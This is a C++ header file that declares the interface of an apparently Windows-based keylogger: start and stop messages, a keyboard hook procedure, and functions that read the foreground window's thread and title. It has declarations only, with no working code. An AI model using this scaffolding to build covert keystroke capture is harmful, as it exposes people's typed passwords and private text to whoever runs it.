#pragma once

#include "resource.h"
#include <windows.h>
#include "hardware.hpp"

#define WM_START_KEYLOGGER (WM_USER + 1)
#define WM_STOP_KEYLOGGER (WM_USER + 2)

//HINSTANCE get_instance();
//
//HHOOK get_keyboard_hook_handler();
//
//bool hook_keyboard();
//
//bool unhook_keyboard();

HWND& get_window_hWnd();

LRESULT CALLBACK keyboard_hook_proc(int code, WPARAM wParam, LPARAM lParam);

Hardware& get_keyboard_hardware_instance();

DWORD get_foreground_window_threadId();

BOOL get_foreground_window_name(__out LPWSTR lpCurrWindowName);